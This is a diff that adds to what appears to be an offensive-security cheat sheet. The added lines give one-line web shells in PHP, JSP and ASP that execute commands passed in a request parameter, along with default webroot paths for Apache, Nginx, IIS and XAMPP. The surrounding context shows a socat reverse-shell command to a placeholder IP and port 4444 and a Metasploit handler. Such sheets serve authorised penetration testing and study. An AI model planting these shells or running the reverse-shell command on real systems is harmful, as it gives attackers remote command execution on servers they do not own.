@@ -562,6 +562,23 @@ $ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP address>:4444
 msf> use exploit/multi/handler
 ```
 
+- Web Shells
+
+```
+PHP: <?php system($_REQUEST["cmd"]); ?>
+JSP: <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+ASP: <% eval request("cmd") %>
+```
+
+- Default Webroot Locations
+
+```
+Apache: /var/www/html/
+Nginx: /usr/local/nginx/html/
+IIS: c:\inetpub\wwwroot\
+XAMPP: C:\xampp\htdocs\
+```
+
 - MSFvenom
 
 ```
